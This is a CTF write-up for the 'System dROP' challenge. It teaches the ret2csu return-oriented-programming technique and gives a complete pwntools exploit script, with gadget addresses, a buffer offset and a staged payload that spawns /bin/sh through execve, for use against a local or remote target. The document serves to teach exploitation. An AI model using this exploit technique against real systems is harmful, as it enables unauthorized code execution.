---
title: "Ret2CSU"
date: 2021-04-24T11:42:16-04:00
---

# What is `__libc_csu_init` anyway?

Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event.
Let's talk about the `System dROP` challenge. 

A while ago, I'd read a [BlackHat paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)
on something called 'ret2csu'. 
The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there
exists two segments of assembly, that when used together, can be very useful in constructing ROP
chains without needing bother with any ASLR'd library, provided there exists some other useful code
within the main ELF. There's an additional hurdle if PIE is enabled, but it remains just that, a
temporary road block. 

I hadn't yet run into the need to use it, until this challenge.

## Sytem dROP
Maybe I didn't _need_ ret2csu. If you take the capital letters (or the flag text itself) from this
challenge, signs point to the use of the SROP, (or SIGret) technique. I didn't go that route. I've
written about SIGROP before, [check it
out](https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/) if you're
interested. 
 
## The Gadgets
Here's the injected function's disassembled code.

```nasm
0000000000400570 <__libc_csu_init>:
  400570:       41 57                   push   r15
  400572:       41 56                   push   r14
  400574:       49 89 d7                mov    r15,rdx
  400577:       41 55                   push   r13
  400579:       41 54                   push   r12
  40057b:       4c 8d 25 8e 08 20 00    lea    r12,[rip+0x20088e]        # 600e10 <__frame_dummy_init_array_entry>
  400582:       55                      push   rbp
  400583:       48 8d 2d 8e 08 20 00    lea    rbp,[rip+0x20088e]        # 600e18 <__do_global_dtors_aux_fini_array_entry>
  40058a:       53                      push   rbx
  40058b:       41 89 fd                mov    r13d,edi
  40058e:       49 89 f6                mov    r14,rsi
  400591:       4c 29 e5                sub    rbp,r12
  400594:       48 83 ec 08             sub    rsp,0x8
  400598:       48 c1 fd 03             sar    rbp,0x3
  40059c:       e8 5f fe ff ff          call   400400 <_init>
  4005a1:       48 85 ed                test   rbp,rbp
  4005a4:       74 20                   je     4005c6 <__libc_csu_init+0x56>
  4005a6:       31 db                   xor    ebx,ebx
  4005a8:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  4005af:       00
  4005b0:       4c 89 fa                mov    rdx,r15
  4005b3:       4c 89 f6                mov    rsi,r14
  4005b6:       44 89 ef                mov    edi,r13d
  4005b9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005bd:       48 83 c3 01             add    rbx,0x1
  4005c1:       48 39 dd                cmp    rbp,rbx
  4005c4:       75 ea                   jne    4005b0 <__libc_csu_init+0x40>
  4005c6:       48 83 c4 08             add    rsp,0x8
  4005ca:       5b                      pop    rbx
  4005cb:       5d                      pop    rbp
  4005cc:       41 5c                   pop    r12
  4005ce:       41 5d                   pop    r13
  4005d0:       41 5e                   pop    r14
  4005d2:       41 5f                   pop    r15
  4005d4:       c3                      ret
  4005d5:       90                      nop
  4005d6:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
```

 The two relevant pieces are (we'll get to why in a bit):

```nasm
  4005ca:       5b                      pop    rbx
  4005cb:       5d                      pop    rbp
  4005cc:       41 5c                   pop    r12
  4005ce:       41 5d                   pop    r13
  4005d0:       41 5e                   pop    r14
  4005d2:       41 5f                   pop    r15
  4005d4:       c3                      ret


  4005b0:       4c 89 fa                mov    rdx,r15
  4005b3:       4c 89 f6                mov    rsi,r14
  4005b6:       44 89 ef                mov    edi,r13d
  4005b9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
```

## The Code

`main:` calls 2 functions, then returns

```nasm
400541:       55                      push   rbp
400542:       48 89 e5                mov    rbp,rsp
400545:       48 83 ec 20             sub    rsp,0x20
400549:       bf 0f 00 00 00          mov    edi,0xf
40054e:       e8 dd fe ff ff          call   400430 <alarm@plt>
400553:       48 8d 45 e0             lea    rax,[rbp-0x20]
400557:       ba 00 01 00 00          mov    edx,0x100
40055c:       48 89 c6                mov    rsi,rax
40055f:       bf 00 00 00 00          mov    edi,0x0
400564:       e8 d7 fe ff ff          call   400440 <read@plt>
400569:       b8 01 00 00 00          mov    eax,0x1
40056e:       c9                      leave
40056f:       c3                      ret
```

The code is fairly simple. We've also only 2 imports from `libc`, `alarm`, and `read`. 
```nasm
0000000000400430 <alarm@plt>:
  400430:       ff 25 e2 0b 20 00       jmp    QWORD PTR [rip+0x200be2]        # 601018 <alarm@GLIBC_2.2.5>
  400436:       68 00 00 00 00          push   0x0
  40043b:       e9 e0 ff ff ff          jmp    400420 <.plt>

0000000000400440 <read@plt>:
  400440:       ff 25 da 0b 20 00       jmp    QWORD PTR [rip+0x200bda]        # 601020 <read@GLIBC_2.2.5>
  400446:       68 01 00 00 00          push   0x1
```


## The Plan

```bash
❯❯ ropper --search 'syscall' --file ./system_drop

[INFO] File: ./system_drop
0x000000000040053b: syscall; ret;
 ```
 
Further analysis will reveal the existence of a `syscall` instruction within the binary. We should
be able to use this to our advantage to call `execve('/bin/sh', 0, 0)`. 

### Overview
1. Find our buffer length
2. Our initial payload will contain all of the _actions_ of our exploit path. (Timey, wimey)
3. We'll trigger an additional read half way through our payload. 
   - This will provide the second half with the _data_ it needs to finish the exploit

   
### Deeper Dive

The first leg of our ret2csu attack will focus on populating some seemingly-arbitrary registers. It
may seem useless to put `syscall` and "/bin/sh" into `r12` and `r13`, after all, that's not the
correct calling convention for x64 asm. The second leg of our csu code will do the rest of the
lifting for us though. 

```nasm
0x4005b0      mov rdx, r15
0x4005b3      mov rsi, r14
0x4005b6      mov edi, r13d
0x4005b9      call qword [r12 + rbx*8]
```

You'll notice that the `call` instruction at `0x4005b9` is de-referencing `r12 + rbx*8`. If we
provide `0` to `rbx`, and a pointer to an address holding the instruction we want called, we should
be in business. We'll also have to set `rax` to `59`, the `syscall` number for `execve`. Luckily,
the return value of `read` is the length of input (we control this!), and that value gets stored at
`rax`.

We have yet to discuss two final pieces of this puzzle. The locations of the string "/bin/sh" and a
pointer to `syscall`'s location'. In this instance, we can simply create that data using the `read`
function. 

The `.bss` section of an ELF gets loaded into memory as a `rw-` segment. This will do nicely. We
don't need execution on this data. Given a known-constant address that's writeable, we can use this
address as arguments to functions we want to set up, even if the data there is yet to be written. 

We'll need a gadget to set `rsi`, our read destination aka `bss`

```
NAME
       read - read from a file descriptor
SYNOPSIS
                      rdi      rsi         rsx
       ssize_t read(int fd, void *buf, size_t count);
```

Half way through our exploit, we'll read the values in to the locations where we told future
instructions to look.

Abstractly, this is difficult to explain. We're essentially planning out 2 moves in advance,
whereby the first move requests additional data in order to correctly complete the second. Again,
Timey, wimey

## The Exploit

### Finding the offset

We'll keep this section short. It's 40.

```bash
pwndbg> r <<(cyclic 80)
Starting program: ./system_drop <<(cyclic 80)

Program received signal SIGSEGV, Segmentation fault.
0x000000000040056f in main ()

pwndbg> x/dx $rsp
0x7fffffffe1c8: 0x6161616b
pwndbg> cyclic -l 0x6161616b
40
```

### Getting the `.bss` addresses

You can get this dynamically from `pwntools` or manually with `objdump` or any disassembler of your
choice. 

```python
from pwn import *
In [1]: from pwn import *
In [2]: context.binary = "./system_drop"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
In [3]: hex( context.binary.bss() )
Out[3]: '0x601038'
```

```bash
$ objdump -D ./system_drop | grep -A 3 bss

Disassembly of section .bss:
0000000000601038 <completed.7698>:
```


### Kick off a new `read` to fill `.bss`

When we take control of the program, we will have just completed a `read` where the arguments
were `read(1, $dest, 0x100)`. The 1st and 3rd arguments work great for us, so we'll
only need to find a `pop rsi` gadget in order to set the 2nd argument to before jumping to read
again. 
```

``` bash
pwndbg> ropper --  --search 'pop rsi'

[INFO] File: system_drop
0x00000000004005d1: pop rsi; pop r15; ret;
```

Great. We can also dynamically fetch this in pwntools. I try to be kind to my future self when
writing these exploits and avoid using "magic numbers". In a year when I look back, I won't
remember where `0x4005d1` came from.

In any case, we can start building our payload.

```python
limit = 40
pop_rsi_r15_ret = next(e.search(asm('pop rsi; pop r15; ret')))
ptr_bin_sh = e.bss()
ptr_syscall = ptr_bin_sh + 8

payload = b"A"*limit
payload += p64(pop_rsi_r15_ret)     # prepare additional `read`
payload += p64(ptr_bin_sh)          # rsi - read dest
payload += p64(0xdeadc0de)          # r15 - junk
# ret
payload += p64(e.sym.read)          # read in bin/sh to .bss
# ret
```

### `__libc_csu_init`
When sending the previous code, the program will receive more input, which will contain the string
`/bin/sh\x00` and store it at `ptr_bin_sh`. We now have a known address for the location of the
first argument to `execve`.
 
Let's build the `csu` portion of the payload:
 
 ```python
payload += p64(csu_one)             # kick off register-setup with ret2csu
payload += p64(0)                   # pop rbx
payload += p64(0)                   # pop rbp
payload += p64(ptr_syscall)         # pop r12 -(stage 2)-> call [r12+rbx*8]
payload += p64(ptr_bin_sh)          # pop r13 -(stage 2)-> rdi
payload += p64(0)                   # pop r14 -(stage 2)-> rsi
payload += p64(0)                   # pop r15 -(stage 2)-> rdx
# ret
payload += p64(csu_two)             # stage 2 finishes -> register setup
io.sendling(payload)
```

We'll use the same strategy for creating `ptr_syscall` that we did for `ptr_bin_sh`. We'll pass it
in later, during the first read. 

At this point, we could send the payload. This will trigger a `read`, we can pass in our second
stage and populate the arguments we'd need for execution during the second half of the exploit.

The secondary payload contains the 8-byte string for `"/bin/sh\x00"` followed by the syscall
address. We'll tack on a padding of null bytes until we reach a length of 59. This is because we'll
be jumping to `syscall` and we need `rax` to equal 59 when we do. The return value of `read` is the
length of the payload, which we control, and is stored at `rax`

```python
syscall = next(e.search(asm('syscall')))

payload = b"/bin/sh\x00"
payload += p64(syscall)
payload = payload.ljust(c.SYS_execve, b"\x00") # c is pwnlib.constants

io.send(payload)
io.interactive()
```
## Conclusion

Let's put it all together

```python
#!/usr/bin/env python3

from pwn import context, gdb, log, args, remote, process, p64, asm, constants as c
import sys

usage = """
    sploit.py <BIN> [REMOTE=x.x.x.x:yy] [GDB,DEBUG]
    GDB     Enables use of GDB during exploit development. Require tmux
    DEBUG   Enables debug logging in pwntool
    REMOTE= Set the host and port to which the exploit will be sent
            GDB cannot be used with this mode
"""

BIN = "./system_drop"


def init(gdbrc):
    if len(sys.argv) != 2 and BIN == "":
        log.warn(usage)
        sys.exit(1)
    binary = BIN or sys.argv[1]
    context.binary = binary
    if args.REMOTE:
        HOST, PORT = args.REMOTE.split(":", 1)
        return remote(HOST, PORT)
    elif args.GDB:
        # context.terminal = ["tmux", "splitw", "-h", "-p", "75"]
        context.terminal = ["tmux", "neww"]
        return gdb.debug(binary, gdbrc)
    else:
        return process(binary)


def main(io):
    # import ipdb;ipdb.set_trace(context=5)
    limit = 40
    e = context.binary

    """
    0x004005ca      pop rbx
    0x004005cb      pop rbp
    0x004005cc      pop r12
    0x004005ce      pop r13
    0x004005d0      pop r14
    0x004005d2      pop r15
    0x004005d4      ret
    """
    csu_one = 0x4005ca

    """
    0x004005b0      mov rdx, r15       ; char **ubp_av
    0x004005b3      mov rsi, r14       ; int argc
    0x004005b6      mov edi, r13d      ; func main
    0x004005b9      call qword [r12 + rbx*8]
    """
    csu_two = 0x4005b0

    pop_rsi_r15_ret = next(e.search(asm('pop rsi; pop r15; ret')))
    ptr_bin_sh = e.bss()
    ptr_syscall = ptr_bin_sh + 8

    payload = b"A"*limit
    payload += p64(pop_rsi_r15_ret)     # prepare additional `read`
    payload += p64(ptr_bin_sh)          # rsi - read dest
    payload += p64(0xdeadc0de)          # r15 - junk
    # ret
    payload += p64(e.sym.read)          # read in bin/sh and syscall to .bss
    # ret
    payload += p64(csu_one)             # kick off register setup with ret2csu
    payload += p64(0)                   # pop rbx
    payload += p64(0)                   # pop rbp
    payload += p64(ptr_syscall)         # pop r12 -> call [r12+rbx*8]
    payload += p64(ptr_bin_sh)          # pop r13 -> rdi
    payload += p64(0)                   # pop r14 -> rsi
    payload += p64(0)                   # pop r15 -> rdx
    # ret
    payload += p64(csu_two)             # stage 2 finishes -> register setup
    io.sendline(payload)

    syscall = next(e.search(asm('syscall')))
    payload = b"/bin/sh\x00" + p64(syscall)
    payload = payload.ljust(c.SYS_execve, b"\x00")
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    gdbrc = """
    # b read
    # b *__libc_csu_init+73
    # c
    """
    io = init(gdbrc)
    main(io)
```


